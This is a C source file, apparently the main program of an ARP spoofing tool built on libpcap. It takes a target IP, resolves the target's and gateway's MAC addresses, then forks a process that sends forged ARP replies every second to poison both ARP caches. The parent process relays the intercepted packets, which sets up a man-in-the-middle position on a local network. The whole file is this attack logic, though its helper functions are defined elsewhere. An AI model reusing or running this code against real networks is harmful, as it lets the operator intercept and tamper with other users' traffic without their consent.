#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include "networkinfo.h"
#include "packetcntl.h"
#include "arp.h"

int main(void){
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct pcap_pkthdr hdr;
    const u_char *packet;
    u_char s_ip[IPSIZE], t_ip[IPSIZE],  g_ip[IPSIZE];
    u_char s_mac[MACASIZE], t_mac[MACASIZE], g_mac[MACASIZE];
    u_char sp_buf[MTUSIZE];
    pcap_t *pcd;  // packet capture descriptor

    dev = pcap_lookupdev(errbuf); // 디바이스 이름
    if (dev == NULL)    {
        printf("%s\n", errbuf);
        exit(1);
    }

    pcd = pcap_open_live(dev, BUFSIZ,  1, 1000, errbuf);
    if (pcd == NULL){
        printf("%s\n", errbuf);
        exit(1);
    }
    printf("Target IP Address: ");
    scanf("%s", t_ip);

    if((sendarpreq(pcd, dev, sp_buf, t_ip)) == -1){
        pcap_perror(pcd,0);
        pcap_close(pcd);
        exit(1);
    }
    while(1){
        packet = pcap_next(pcd, &hdr);
        if(gett_mac(packet, t_mac, t_ip) == 1)
            break;
    }

    getGIPAddress(dev, g_ip);
    getGMACAddress(g_ip, g_mac);
    getMIPAddress(dev, s_ip);
    getMMACAddress(dev, s_mac);

    int pid = fork();
    if(pid == 0){
        while(1){
            printf("send arp reply packet\n");
            if((sendarprep(pcd ,dev, sp_buf, g_ip, s_mac, t_ip, t_mac)) ==-1) {
                pcap_perror(pcd,0);
                pcap_close(pcd);
                exit(1);
            };
            if((sendarprep(pcd, dev, sp_buf, t_ip, s_mac, g_ip, g_mac)) ==-1) {
                pcap_perror(pcd,0);
                pcap_close(pcd);
                exit(1);
            };
            sleep(1);
        }
    }
    else{
        while(1){
            packet = pcap_next(pcd, &hdr);
            packetrelay(pcd, dev, packet, g_ip, t_ip, s_mac, t_mac, g_mac);
        }
    }
    return 0;
}
